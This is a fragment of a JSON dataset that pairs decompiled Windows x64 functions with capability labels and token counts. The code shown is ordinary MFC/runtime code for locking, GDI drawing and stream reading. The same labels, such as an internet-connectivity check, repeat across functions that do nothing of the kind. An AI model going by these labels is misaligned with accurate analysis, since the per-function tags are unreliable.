        "decompiled_code": "\nvoid fcn.14001559c(uint *arg1, ulong *arg2, int64_t arg3)\n\n{\n    ulong *puVar1;\n    bool bVar2;\n    int64_t iVar3;\n    int32_t iVar4;\n    int64_t iVar5;\n    \n    bVar2 = true;\n    iVar4 = 1;\n    if (1 < *(arg2 + 2)) {\n        iVar3 = 8;\n        iVar5 = 0x10;\n        do {\n            if ((arg3 == 0) || (*(*(arg1 + 4) + 8 + iVar5) == arg3)) {\n                puVar1 = *(iVar3 + arg2[3]);\n                if (puVar1 != NULL) {\n                    (***puVar1)(puVar1, 1);\n                }\n                *(iVar3 + arg2[3]) = 0;\n            }\n            else if (*(iVar3 + arg2[3]) != 0) {\n                bVar2 = false;\n            }\n            iVar4 = iVar4 + 1;\n            iVar5 = iVar5 + 0x10;\n            iVar3 = iVar3 + 8;\n        } while (iVar4 < *(arg2 + 2));\n        if (!bVar2) {\n            return;\n        }\n    }\n    (*_sym.imp.KERNEL32.dll_EnterCriticalSection)(arg1 + 10);\n    fcn.1400150f0(arg1 + 6, arg2);\n    (*_sym.imp.KERNEL32.dll_LeaveCriticalSection)(arg1 + 10);\n    (*_sym.imp.KERNEL32.dll_LocalFree)(arg2[3]);\n    (***arg2)(arg2, 1);\n    (*_sym.imp.KERNEL32.dll_TlsSetValue)(*arg1, 0);\n    return;\n}\n",
        "token_count": 387
    },
    "14001571": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint64_t fcn.140015718(uint32_t *arg1, code *arg2)\n\n{\n    code *pcVar1;\n    uint32_t uVar2;\n    int64_t iVar3;\n    \n    if (arg2 == NULL) {\n        fcn.140005e30();\n        pcVar1 = swi(3);\n        iVar3 = (*pcVar1)();\n        return iVar3;\n    }\n    if (*arg1 == 0) {\n        if (*0x140053400 == 0) {\n            *0x140053400 = fcn.14001516c(0x140053410);\n            if (*0x140053400 == 0) {\n                fcn.140005e30();\n                pcVar1 = swi(3);\n                iVar3 = (*pcVar1)();\n                return iVar3;\n            }\n        }\n        uVar2 = fcn.1400151bc(*0x140053400);\n        *arg1 = uVar2;\n        if (uVar2 == 0) {\n            fcn.140005e30();\n            pcVar1 = swi(3);\n            iVar3 = (*pcVar1)();\n            return iVar3;\n        }\n    }\n    iVar3 = fcn.140014fa8(*0x140053400, *arg1);\n    if (iVar3 == 0) {\n        iVar3 = (*arg2)();\n        fcn.1400153ec(*0x140053400, *arg1, iVar3);\n    }\n    return iVar3;\n}\n",
        "token_count": 331
    },
    "140015b2": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid fcn.140015b20(int64_t arg1)\n\n{\n    int64_t iVar1;\n    ulong uVar2;\n    int64_t iVar3;\n    ulong *puVar4;\n    \n    if (*(arg1 + 0x20) == 0) {\n        iVar3 = fcn.140018cc4(arg1 + 0x28, *(arg1 + 0x30), 0x18);\n        iVar1 = *(arg1 + 0x30);\n        puVar4 = iVar3 + -0x10 + iVar1 * 0x18;\n        while (iVar1 = iVar1 + -1,  -1 < iVar1) {\n            *puVar4 = *(arg1 + 0x20);\n            *(arg1 + 0x20) = puVar4;\n            puVar4 = puVar4 + -3;\n        }\n    }\n    puVar4 = *(arg1 + 0x20);\n    uVar2 = *puVar4;\n    *(arg1 + 0x18) = *(arg1 + 0x18) + 1;\n    *(arg1 + 0x20) = uVar2;\n    puVar4[1] = 0;\n    puVar4[2] = 0;\n    return;\n}\n",
        "token_count": 282
    },
    "140015e5": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint64_t * fcn.140015e54(int64_t *arg1, int64_t *arg2, char *arg3, int32_t *arg4)\n\n{\n    uint64_t arg1_00;\n    int32_t iVar1;\n    code *pcVar2;\n    int32_t iVar3;\n    uint32_t uVar4;\n    int64_t *piVar5;\n    int64_t iVar6;\n    uint64_t uVar7;\n    \n    iVar3 = *arg4;\n    if (iVar3 < 0) {\n        fcn.140001010(0x80070057);\n        pcVar2 = swi(3);\n        piVar5 = (*pcVar2)();\n        return piVar5;\n    }\n    if ((arg3 == NULL) || (*arg3 == '\\0')) {\n        if (iVar3 < *(*arg1 + -0x10)) {\n            piVar5 = *(*arg1 + -0x18);\n            if (piVar5 == NULL) {\n                iVar6 = 0;\n            }\n            else {\n                iVar6 = (**(*piVar5 + 0x20))();\n            }\n            if (iVar6 == 0) {\n                piVar5 = fcn.14000fd70();\n                iVar6 = (**(*piVar5 + 0x20))(piVar5);\n            }\n            fcn.140015db8(arg2, *arg4 + *arg1, iVar6);\n            return arg2;\n        }\n    }\n    else {\n        iVar6 = *arg1;\n        arg1_00 = iVar6 + iVar3;\n        uVar7 = *(iVar6 + -0x10) + iVar6;\n        if (arg1_00 < uVar7) {\n            iVar3 = fcn.14001ce54(arg1_00, arg3);\n            if (iVar3 + arg1_00 < uVar7) {\n                uVar4 = fcn.14001cf7c(iVar3 + arg1_00, arg3);\n                iVar1 = *arg4;\n                *arg4 = iVar3 + iVar1 + 1U + uVar4;\n                fcn.140015ce4(arg1, arg2, iVar3 + iVar1, uVar4);\n                return arg2;\n            }\n        }\n    }\n    *arg4 = -1;\n    if (*(*arg1 + -0x18) == NULL) {\n        piVar5 = NULL;\n    }\n    else {\n        piVar5 = (**(**(*arg1 + -0x18) + 0x20))();\n    }\n    if (piVar5 == NULL) {\n        piVar5 = fcn.14000fd70();\n        piVar5 = (**(*piVar5 + 0x20))(piVar5);\n        if (piVar5 == NULL) {\n            fcn.140001010(0x80004005);\n            pcVar2 = swi(3);\n            piVar5 = (*pcVar2)();\n            return piVar5;\n        }\n    }\n    iVar6 = (**(*piVar5 + 0x18))();\n    *arg2 = iVar6 + 0x18;\n    return arg2;\n}\n",
        "token_count": 693
    },
    "140015fa": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid fcn.140015fa4(void)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    int64_t iVar3;\n    int64_t iVar4;\n    ulong arg2;\n    uint auStackX8 [2];\n    int64_t iStackX16;\n    int64_t aiStackX24 [2];\n    \n    iVar3 = fcn.140006c48();\n    fcn.140016f8c(1);\n    auStackX8[0] = 0;\n    iVar3 = iVar3 + 0x58;\n    fcn.140015e54(iVar3, &iStackX16, 0x140032468, auStackX8);\n    iVar2 = *(iStackX16 + -0x10);\n    while (iVar2 != 0) {\n        iVar4 = fcn.140006c48();\n        (*_sym.imp.USER32.dll_UnregisterClassA)(iStackX16, *(iVar4 + 0x10));\n        arg2 = fcn.140015e54(iVar3, aiStackX24, 0x140032468, auStackX8);\n        fcn.140002480(&iStackX16, arg2);\n        LOCK();\n        piVar1 = aiStackX24[0] + -8;\n        iVar2 = *piVar1;\n        *piVar1 = *piVar1 + -1;\n        if (iVar2 + -1 < 1) {\n            (**(**(aiStackX24[0] + -0x18) + 8))();\n        }\n        iVar2 = *(iStackX16 + -0x10);\n    }\n    fcn.140002020(iVar3);\n    fcn.140017020(1);\n    LOCK();\n    piVar1 = iStackX16 + -8;\n    iVar2 = *piVar1;\n    *piVar1 = *piVar1 + -1;\n    if (iVar2 + -1 < 1) {\n        (**(**(iStackX16 + -0x18) + 8))();\n    }\n    return;\n}\n",
        "token_count": 461
    },
    "14001609": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid fcn.140016094(void)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    int64_t iVar3;\n    int64_t iVar4;\n    \n    fcn.140015fa4();\n    iVar3 = fcn.140006c48();\n    if ((*(iVar3 + 8) != 0) && (pcVar1 = *(*(iVar3 + 8) + 0x78),  pcVar1 != NULL)) {\n        (*pcVar1)(1);\n    }\n    iVar3 = fcn.140006c98();\n    if (*(iVar3 + 0x78) != NULL) {\n        iVar2 = (**(**(iVar3 + 0x78) + 0x288))();\n        if (iVar2 != 0) {\n            *(iVar3 + 0x78) = 0;\n        }\n    }\n    iVar3 = fcn.140006414();\n    iVar4 = fcn.140006c48();\n    if (*(iVar4 + 0x28) == '\\0') {\n        if (*(iVar3 + 0x50) != 0) {\n            (*_sym.imp.USER32.dll_UnhookWindowsHookEx)();\n            *(iVar3 + 0x50) = 0;\n        }\n        if (*(iVar3 + 0x48) != 0) {\n            (*_sym.imp.USER32.dll_UnhookWindowsHookEx)();\n            *(iVar3 + 0x48) = 0;\n        }\n    }\n    return;\n}\n",
        "token_count": 327
    },
    "1400162f": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\nvoid fcn.1400162f4(int64_t arg1, ulong arg2)\n\n{\n    int64_t iVar1;\n    int64_t iStackX8;\n    int64_t iStackX16;\n    uchar auStackX24 [8];\n    \n    if (arg1 != 0) {\n        iStackX16 = -(*(arg1 + 0x80) != 0);\n        while (iStackX16 != 0) {\n            fcn.140015a20(arg1 + 0x68, &iStackX16, auStackX24, &iStackX8);\n            iVar1 = *(arg1 + 0xa8);\n            *(iStackX8 + iVar1) = 0;\n            if (*(arg1 + 0xb0) == 2) {\n                *(iStackX8 + 8 + iVar1) = 0;\n            }\n            (**(arg1 + 0x28))(iStackX8);\n        }\n        fcn.1400158d0(arg1 + 0x68);\n        fcn.140018d48(arg1 + 8);\n    }\n    return;\n}\n",
        "token_count": 248
    },
    "1400166c": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\nvoid fcn.1400166c8(int64_t arg1, ulong arg2, ulong noname_2, ulong arg4)\n\n{\n    uint32_t uVar1;\n    uchar auStack88 [32];\n    char *pcStack56;\n    uint uStack48;\n    uchar auStack40 [16];\n    uint64_t uStack24;\n    \n    uStack24 = *0x14003e1a0 ^ auStack88;\n    if ((arg1 != 0) && (uVar1 = (*_sym.imp.USER32.dll_GetWindowLongA)(arg1, 0xfffffff0),  (uVar1 & 0xf) == arg2)) {\n        (*_sym.imp.USER32.dll_GetClassNameA)(arg1, auStack40, 10);\n        uStack48 = 0xffffffff;\n        pcStack56 = \"combobox\";\n        (*_sym.imp.KERNEL32.dll_CompareStringA)(0x409, 1, auStack40);\n    }\n    fcn.14001b410(uStack24 ^ auStack88);\n    return;\n}\n",
        "token_count": 234
    },
    "14001676": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\nvoid fcn.14001676c(ulong hWnd, ulong arg2, ulong noname_2, ulong arg4)\n\n{\n    uchar auStack104 [32];\n    ulong uStack72;\n    uint uStack64;\n    uchar auStack56 [32];\n    uint64_t uStack24;\n    \n    uStack24 = *0x14003e1a0 ^ auStack104;\n    (*_sym.imp.USER32.dll_GetClassNameA)(hWnd, auStack56, 0x20);\n    uStack64 = 0xffffffff;\n    uStack72 = arg2;\n    (*_sym.imp.KERNEL32.dll_CompareStringA)(0x409, 1, auStack56);\n    fcn.14001b410(uStack24 ^ auStack104);\n    return;\n}\n",
        "token_count": 170
    },
    "14001686": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid fcn.14001686c(void)\n\n{\n    int32_t iVar1;\n    int64_t iVar2;\n    int32_t iVar3;\n    int16_t *piVar4;\n    uchar auStack88 [32];\n    int16_t *piStack56;\n    int16_t aiStack40 [8];\n    uint64_t uStack24;\n    \n    uStack24 = *0x14003e1a0 ^ auStack88;\n    fcn.140016f8c(8);\n    if (*0x140053468 == 0) {\n        piVar4 = aiStack40;\n        iVar1 = 0;\n        do {\n            iVar3 = iVar1 + 1;\n            *piVar4 = 0x5555 << (iVar1 & 1);\n            piVar4 = piVar4 + 1;\n            iVar1 = iVar3;\n        } while (iVar3 < 8);\n        piStack56 = aiStack40;\n        iVar2 = (*_sym.imp.GDI32.dll_CreateBitmap)(8, 8, 1, 1);\n        if (iVar2 != 0) {\n            *0x140053468 = (*_sym.imp.GDI32.dll_CreatePatternBrush)(iVar2);\n            (*_sym.imp.GDI32.dll_DeleteObject)(iVar2);\n        }\n    }\n    if (*0x140053470 == '\\0') {\n        iVar1 = fcn.14001b57c(0x140016860);\n        *0x140053470 = iVar1 == 0;\n    }\n    fcn.140017020(8);\n    fcn.1400077ac(*0x140053468);\n    fcn.14001b410(uStack24 ^ auStack88);\n    return;\n}\n",
        "token_count": 379
    },
    "14001694": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid fcn.140016944(int64_t *arg1, ulong arg2, ulong arg3, uint *arg4)\n\n{\n    code *pcVar1;\n    ulong uVar2;\n    int64_t arg2_00;\n    code **arg2_01;\n    int32_t iStackX24;\n    int32_t iStackX28;\n    int32_t in_stack_00000028;\n    int32_t in_stack_0000002c;\n    int64_t in_stack_00000030;\n    int64_t in_stack_00000038;\n    int32_t iStack128;\n    int32_t iStack124;\n    int32_t iStack120;\n    int32_t iStack116;\n    code *pcStack112;\n    int64_t iStack104;\n    code *pcStack96;\n    ulong uStack88;\n    code *pcStack80;\n    ulong uStack72;\n    code *pcStack64;\n    ulong uStack56;\n    code *pcStack48;\n    ulong uStack40;\n    \n    uStack40 = 0;\n    pcStack48 = vtable.CRgn.0;\n    uStack56 = 0;\n    pcStack64 = vtable.CRgn.0;\n    uStack72 = 0;\n    pcStack80 = vtable.CRgn.0;\n    uVar2 = (*_sym.imp.GDI32.dll_CreateRectRgnIndirect)(arg2);\n    fcn.1400077d0(&pcStack64, uVar2);\n    (*_sym.imp.USER32.dll_CopyRect)(&iStack128, arg2);\n    iStackX28 = arg3 >> 0x20;\n    iStackX24 = arg3;\n    (*_sym.imp.USER32.dll_InflateRect)(&iStack128, -iStackX24, -iStackX28);\n    (*_sym.imp.USER32.dll_IntersectRect)(&iStack128, &iStack128, arg2);\n    uVar2 = (*_sym.imp.GDI32.dll_CreateRectRgnIndirect)(&iStack128);\n    fcn.1400077d0(&pcStack80, uVar2);\n    uVar2 = (*_sym.imp.GDI32.dll_CreateRectRgn)(0, 0, 0, 0);\n    fcn.1400077d0(&pcStack48, uVar2);\n    (*_sym.imp.GDI32.dll_CombineRgn)(uStack40, uStack56, uStack72, 3);\n    if (in_stack_00000030 == 0) {\n        in_stack_00000030 = fcn.14001686c();\n    }\n    if (in_stack_00000030 == 0) {\n        fcn.140005e30();\n        pcVar1 = swi(3);\n        (*pcVar1)();\n        return;\n    }\n    if (in_stack_00000038 == 0) {\n        in_stack_00000038 = in_stack_00000030;\n    }\n    uStack88 = 0;\n    pcStack96 = vtable.CRgn.0;\n    iStack104 = 0;\n    pcStack112 = vtable.CRgn.0;\n    if (arg4 != NULL) {\n        uVar2 = (*_sym.imp.GDI32.dll_CreateRectRgn)(0, 0, 0, 0);\n        fcn.1400077d0(&pcStack96, uVar2);\n        (*_sym.imp.GDI32.dll_SetRectRgn)(uStack56, *arg4, arg4[1], arg4[2], arg4[3]);\n        (*_sym.imp.USER32.dll_CopyRect)(&iStack128, arg4);\n        (*_sym.imp.USER32.dll_InflateRect)(&iStack128, -in_stack_00000028, -in_stack_0000002c);\n        (*_sym.imp.USER32.dll_IntersectRect)(&iStack128, &iStack128, arg4);\n        (*_sym.imp.GDI32.dll_SetRectRgn)(uStack72, iStack128, iStack124, iStack120, iStack116);\n        (*_sym.imp.GDI32.dll_CombineRgn)(uStack88, uStack56, uStack72, 3);\n        if (*(in_stack_00000030 + 8) == *(in_stack_00000038 + 8)) {\n            uVar2 = (*_sym.imp.GDI32.dll_CreateRectRgn)(0, 0, 0, 0);\n            fcn.1400077d0(&pcStack112, uVar2);\n            (*_sym.imp.GDI32.dll_CombineRgn)(iStack104, uStack88, uStack40, 3);\n        }\n    }\n    if ((*(in_stack_00000030 + 8) != *(in_stack_00000038 + 8)) && (arg4 != NULL)) {\n        fcn.140007288(arg1, &pcStack96);\n        (**(*arg1 + 0xa0))(arg1, &iStack128);\n        uVar2 = fcn.140007910(arg1, in_stack_00000038);\n        (*_sym.imp.GDI32.dll_PatBlt)\n                  (arg1[1], iStack128, iStack124, iStack120 - iStack128, iStack116 - iStack124, 0x5a0049);\n        fcn.140007910(arg1, uVar2);\n    }\n    arg2_01 = &pcStack112;\n    if (iStack104 == 0) {\n        arg2_01 = &pcStack48;\n    }\n    fcn.140007288(arg1, arg2_01);\n    (**(*arg1 + 0xa0))(arg1, &iStack128);\n    arg2_00 = fcn.140007910(arg1, in_stack_00000030);\n    (*_sym.imp.GDI32.dll_PatBlt)(arg1[1], iStack128, iStack124, iStack120 - iStack128, iStack116 - iStack124, 0x5a0049);\n    if (arg2_00 != 0) {\n        fcn.140007910(arg1, arg2_00);\n    }\n    fcn.140007288(arg1, 0);\n    pcStack112 = vtable.CRgn.0;\n    fcn.140002730(&pcStack112);\n    pcStack96 = vtable.CRgn.0;\n    fcn.140002730(&pcStack96);\n    pcStack80 = vtable.CRgn.0;\n    fcn.140002730(&pcStack80);\n    pcStack64 = vtable.CRgn.0;\n    fcn.140002730(&pcStack64);\n    pcStack48 = vtable.CRgn.0;\n    fcn.140002730(&pcStack48);\n    return;\n}\n",
        "token_count": 1491
    },
    "140016e8": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nulong fcn.140016e8c(int64_t arg1)\n\n{\n    ulong uVar1;\n    \n    if (*(arg1 + 8) == 0) {\n        uVar1 = 0;\n    }\n    else {\n        uVar1 = fcn.140016e48(arg1);\n        uVar1 = (*_sym.imp.USER32.dll_DestroyMenu)(uVar1);\n    }\n    return uVar1;\n}\n",
        "token_count": 94
    },
    "140016f1": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid fcn.140016f1c(void)\n\n{\n    int32_t *piVar1;\n    int64_t iVar2;\n    int64_t iVar3;\n    \n    if (*0x140053474 != 0) {\n        *0x140053474 = *0x140053474 + -1;\n        (*_sym.imp.KERNEL32.dll_DeleteCriticalSection)(0x140053728);\n        piVar1 = 0x140053750;\n        iVar3 = 0x140053480;\n        iVar2 = 0x11;\n        do {\n            if (*piVar1 != 0) {\n                (*_sym.imp.KERNEL32.dll_DeleteCriticalSection)(iVar3);\n                *piVar1 = *piVar1 + -1;\n            }\n            iVar3 = iVar3 + 0x28;\n            piVar1 = piVar1 + 1;\n            iVar2 = iVar2 + -1;\n        } while (iVar2 != 0);\n    }\n    return;\n}\n",
        "token_count": 213
    },
    "140016f8": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid fcn.140016f8c(ulong arg1)\n\n{\n    int32_t *piVar1;\n    code *pcVar2;\n    int64_t iVar3;\n    \n    iVar3 = arg1;\n    if (0x10 < arg1) {\n        fcn.140005e30();\n        pcVar2 = swi(3);\n        (*pcVar2)();\n        return;\n    }\n    if (*0x140053474 == 0) {\n        fcn.140016eec();\n    }\n    if (*(iVar3 * 4 + 0x140053750) == 0) {\n        (*_sym.imp.KERNEL32.dll_EnterCriticalSection)(0x140053728);\n        if (*(iVar3 * 4 + 0x140053750) == 0) {\n            (*_sym.imp.KERNEL32.dll_InitializeCriticalSection)(iVar3 * 0x28 + 0x140053480);\n            piVar1 = iVar3 * 4 + 0x140053750;\n            *piVar1 = *piVar1 + 1;\n        }\n        (*_sym.imp.KERNEL32.dll_LeaveCriticalSection)(0x140053728);\n    }\n    // WARNING: Could not recover jumptable at 0x000140017016. Too many branches\n    // WARNING: Treating indirect jump as call\n    (*_sym.imp.KERNEL32.dll_EnterCriticalSection)(iVar3 * 0x28 + 0x140053480);\n    return;\n}\n",
        "token_count": 319
    },
    "14001708": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid fcn.14001708c(void)\n\n{\n    int32_t iVar1;\n    int64_t iVar2;\n    \n    iVar2 = fcn.140006c48();\n    if (*(iVar2 + 0x54) == 0) {\n        iVar2 = fcn.140006c48();\n        *(iVar2 + 0x54) = 1;\n        iVar2 = fcn.140006c48();\n        iVar2 = *(iVar2 + 8);\n        if ((iVar2 == 0) || (*(iVar2 + 0x40) == 0)) {\n            iVar2 = fcn.140006c48();\n            if (*(iVar2 + 0x28) == '\\0') {\n                fcn.1400119bc(0);\n            }\n        }\n        else {\n            iVar1 = fcn.140007c44(*(iVar2 + 0x40));\n            if (iVar1 != 0) {\n                (**(**(iVar2 + 0x40) + 0xc0))();\n            }\n        }\n    }\n    return;\n}\n",
        "token_count": 233
    },
    "14001710": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid fcn.14001710c(void)\n\n{\n    uint uVar1;\n    uchar auStack72 [32];\n    uchar auStack40 [24];\n    uint64_t uStack16;\n    \n    uStack16 = *0x14003e1a0 ^ auStack72;\n    uVar1 = (*_sym.imp.KERNEL32.dll_GetOEMCP)();\n    (*_sym.imp.KERNEL32.dll_GetCPInfo)(uVar1, auStack40);\n    fcn.14001b410(uStack16 ^ auStack72);\n    return;\n}\n",
        "token_count": 121
    },
    "14001715": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint64_t fcn.14001715c(int64_t arg1, int64_t arg2, ulong arg3)\n\n{\n    int64_t *piVar1;\n    code *pcVar2;\n    int32_t iVar3;\n    uint32_t uVar4;\n    uint32_t uVar5;\n    uint64_t uVar6;\n    int32_t iVar7;\n    uint32_t uVar8;\n    int32_t iVar9;\n    uint32_t uVar10;\n    int64_t iVar11;\n    \n    if ((arg3 == 0) || (arg2 == 0)) {\n        uVar6 = 0;\n    }\n    else {\n        if ((*(arg1 + 0x20) & 1) == 0) {\n            fcn.140017da0(4, *(arg1 + 0x18));\n            pcVar2 = swi(3);\n            uVar6 = (*pcVar2)();\n            return uVar6;\n        }\n        piVar1 = arg1 + 0x40;\n        uVar8 = *piVar1 - *(arg1 + 0x38);\n        uVar6 = uVar8;\n        if (arg3 < uVar8) {\n            uVar6 = arg3;\n        }\n        iVar3 = fcn.14001af18(arg2, arg3, *(arg1 + 0x38), uVar6);\n        if (iVar3 != 0) {\n            if (iVar3 == 0xc) {\n                fcn.140005de8();\n                pcVar2 = swi(3);\n                uVar6 = (*pcVar2)();\n                return uVar6;\n            }\n            if ((iVar3 == 0x16) || (iVar3 == 0x22)) {\n                fcn.140005e30();\n                pcVar2 = swi(3);\n                uVar6 = (*pcVar2)();\n                return uVar6;\n            }\n            if (iVar3 != 0x50) {\n                fcn.140005e30();\n                pcVar2 = swi(3);\n                uVar6 = (*pcVar2)();\n                return uVar6;\n            }\n        }\n        *(arg1 + 0x38) = *(arg1 + 0x38) + uVar6;\n        arg2 = arg2 + uVar6;\n        uVar8 = arg3 - uVar6;\n        if (uVar8 != 0) {\n            iVar9 = uVar8 - uVar8 % *(arg1 + 0x28);\n            iVar7 = 0;\n            iVar3 = iVar9;\n            do {\n                uVar4 = (**(**(arg1 + 0x30) + 0x68))(*(arg1 + 0x30), arg2, iVar3);\n                iVar7 = iVar7 + uVar4;\n                iVar3 = iVar3 - uVar4;\n                arg2 = arg2 + uVar4;\n                if (uVar4 == 0) break;\n            } while (iVar3 != 0);\n            uVar8 = uVar8 - iVar7;\n            if ((uVar8 != 0) && (iVar7 == iVar9)) {\n                if (*(arg1 + 0xc) == 0) {\n                    uVar4 = uVar8;\n                    if ((*(arg1 + 0x10) == 0) && (uVar4 = *(arg1 + 0x28),  *(arg1 + 0x28) < uVar8)) {\n                        uVar4 = uVar8;\n                    }\n                    iVar11 = *(arg1 + 0x48);\n                    uVar10 = 0;\n                    do {\n                        uVar5 = (**(**(arg1 + 0x30) + 0x68))(*(arg1 + 0x30), iVar11, uVar4);\n                        uVar10 = uVar10 + uVar5;\n                        uVar4 = uVar4 - uVar5;\n                        iVar11 = iVar11 + uVar5;\n                        if ((uVar5 == 0) || (uVar4 == 0)) break;\n                    } while (uVar10 < uVar8);\n                    iVar11 = *(arg1 + 0x48);\n                    *piVar1 = uVar10 + iVar11;\n                }\n                else {\n                    (**(**(arg1 + 0x30) + 0xa0))(*(arg1 + 0x30), 0, *(arg1 + 0x28), arg1 + 0x48, piVar1);\n                    iVar11 = *(arg1 + 0x48);\n                }\n                uVar4 = *piVar1 - iVar11;\n                *(arg1 + 0x38) = iVar11;\n                if (uVar8 < uVar4) {\n                    uVar4 = uVar8;\n                }\n                iVar3 = fcn.14001af18(arg2, uVar8, iVar11, uVar4);\n                if (iVar3 != 0) {\n                    if (iVar3 == 0xc) {\n                        fcn.140005de8();\n                        pcVar2 = swi(3);\n                        uVar6 = (*pcVar2)();\n                        return uVar6;\n                    }\n                    if ((iVar3 == 0x16) || (iVar3 == 0x22)) {\n                        fcn.140005e30();\n                        pcVar2 = swi(3);\n                        uVar6 = (*pcVar2)();\n                        return uVar6;\n                    }\n                    if (iVar3 != 0x50) {\n                        fcn.140005e30();\n                        pcVar2 = swi(3);\n                        uVar6 = (*pcVar2)();\n                        return uVar6;\n                    }\n                }\n                *(arg1 + 0x38) = *(arg1 + 0x38) + uVar4;\n                uVar8 = uVar8 - uVar4;\n            }\n        }\n        uVar6 = arg3 - uVar8;\n    }\n    return uVar6;\n}\n",
        "token_count": 1310
    },
    "14001733": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid fcn.140017338(int64_t arg1)\n\n{\n    int64_t *piVar1;\n    int64_t iVar2;\n    \n    if ((*(arg1 + 0x20) & 1) == 0) {\n        piVar1 = arg1 + 0x48;\n        if (*(arg1 + 0xc) == 0) {\n            iVar2 = *piVar1;\n            if (*(arg1 + 0x38) != iVar2) {\n                (**(**(arg1 + 0x30) + 0x70))(*(arg1 + 0x30), iVar2, *(arg1 + 0x38) - iVar2);\n            }\n        }\n        else {\n            if (*(arg1 + 0x38) != *piVar1) {\n                (**(**(arg1 + 0x30) + 0xa0))(*(arg1 + 0x30), 2, *(arg1 + 0x38) - *piVar1, 0, 0);\n            }\n            (**(**(arg1 + 0x30) + 0xa0))(*(arg1 + 0x30), 1, *(arg1 + 0x28), piVar1, arg1 + 0x40);\n        }\n        iVar2 = *piVar1;\n    }\n    else {\n        if (*(arg1 + 0x40) != *(arg1 + 0x38)) {\n            (**(**(arg1 + 0x30) + 0x50))(*(arg1 + 0x30), *(arg1 + 0x38) - *(arg1 + 0x40), 1);\n        }\n        iVar2 = *(arg1 + 0x40);\n    }\n    *(arg1 + 0x38) = iVar2;\n    return;\n}\n",
        "token_count": 400
    },
    "1400173f": {
        "rules": [
